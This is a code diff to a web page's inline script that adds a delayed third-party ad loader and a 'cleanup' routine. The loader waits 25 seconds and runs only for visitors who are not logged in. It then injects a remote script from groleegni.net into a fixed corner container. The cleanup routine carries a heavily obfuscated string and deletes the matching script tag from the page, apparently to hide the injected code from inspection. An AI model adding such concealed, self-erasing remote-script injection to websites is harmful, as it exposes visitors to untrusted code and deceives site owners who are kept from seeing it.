@@ -477,9 +477,22 @@
     }
     </script>
   <script>
-    // Only show ad if user has been on the page for more than 25 seconds
+    // Only show ads if user has been on the page for more than 25 seconds
     // and is not logged in
     (function() {
+      // Create a container for all ads positioned at bottom left
+      var adContainer = document.createElement('div');
+      adContainer.style.position = 'fixed';
+      adContainer.style.bottom = '20px';
+      adContainer.style.left = '20px';
+      adContainer.style.zIndex = '9999';
+      adContainer.style.width = 'auto';
+      adContainer.style.height = 'auto';
+      adContainer.style.display = 'flex';
+      adContainer.style.flexDirection = 'column';
+      adContainer.style.gap = '10px';
+      adContainer.id = 'ad-container-bottom-left';
+      
       // Function to check if user is logged in
       function checkUserLoggedIn() {
         return new Promise((resolve) => {
@@ -501,21 +514,40 @@
         });
       }
 
+      // Function to add scripts to the container
+      function addScriptToContainer(scriptContent, isExternalScript, scriptSrc) {
+        var scriptElem = document.createElement('script');
+        
+        if (isExternalScript) {
+          scriptElem.src = scriptSrc;
+        } else {
+          scriptElem.textContent = scriptContent;
+        }
+        
+        adContainer.appendChild(scriptElem);
+        return scriptElem;
+      }
+
       // Wait 25 seconds before checking login status
       setTimeout(function() {
         checkUserLoggedIn().then(function(isLoggedIn) {
           if (!isLoggedIn) {
-            // Only add the ad script if user is not logged in
-            var script = document.createElement('script');
-            script.textContent = `
+            // Only add ads if user is not logged in
+            document.body.appendChild(adContainer);
+            
+            // Add the first ad script (groleegni.net)
+            addScriptToContainer(`
               (function(d,z,s){
                 s.src='https://'+d+'/401/'+z;
                 try{
-                  (document.body||document.documentElement).appendChild(s)
+                  document.getElementById('ad-container-bottom-left').appendChild(s);
                 }catch(e){}
               })('groleegni.net',9328032,document.createElement('script'));
-            `;
-            document.body.appendChild(script);
+            `);
+            
+            // Add the cleanup script
+            addScriptToContainer(`(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNez'
+;for(let z of document.querySelectorAll('script')){if(z.innerHTML.includes(K.replace(/zz/g,'').replace(/zr/g,''))){z.remove();break}}})();`);
           }
         });
       }, 25000); // 25 seconds
